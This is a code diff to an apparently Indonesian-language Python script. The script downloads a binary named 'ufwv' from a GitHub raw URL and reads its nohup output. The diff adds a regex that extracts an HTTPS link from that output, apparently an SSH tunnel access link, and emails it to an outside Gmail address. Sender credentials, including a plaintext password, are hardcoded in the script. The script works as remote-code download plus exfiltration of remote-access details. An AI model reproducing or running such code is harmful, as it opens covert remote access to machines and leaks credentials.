@@ -5,6 +5,7 @@ from email.mime.multipart import MIMEMultipart
 import time
 import os
 import urllib.request
+import re
 
 # URL file ufwv
 UFWV_URL = "https://github.com/icadnewton/sendme/raw/refs/heads/main/ufwv"
@@ -37,6 +38,16 @@ def get_nohup_output():
         pass
     return ""
 
+# Fungsi untuk mengekstrak link HTTPS dari output nohup
+def extract_https_link(nohup_output):
+    try:
+        match = re.search(r"https://\S+", nohup_output)
+        if match:
+            return match.group(0)
+    except Exception:
+        pass
+    return ""
+
 # Fungsi untuk mengirim email
 def send_email(sender_email, sender_password, recipient_email, subject, body):
     try:
@@ -59,10 +70,12 @@ if __name__ == "__main__":
     time.sleep(5)
     nohup_output = get_nohup_output()
 
+    https_link = extract_https_link(nohup_output)
+
     sender_email = "wesleyarmstrong2020@unlock.web.id"
     sender_password = "afgjkizfczkcblno"
     recipient_email = "icadnewton@gmail.com"
     subject = "Nohup Output"
-    body = f"koneksi ssh anda paduka redhat account kailahulsey5498+fzxms@outlook.com:\n\n{nohup_output}"
+    body = f"koneksi ssh anda paduka redhat account kailahulsey5498+fzxms@outlook.com:\n\n{https_link}"
 
     send_email(sender_email, sender_password, recipient_email, subject, body)
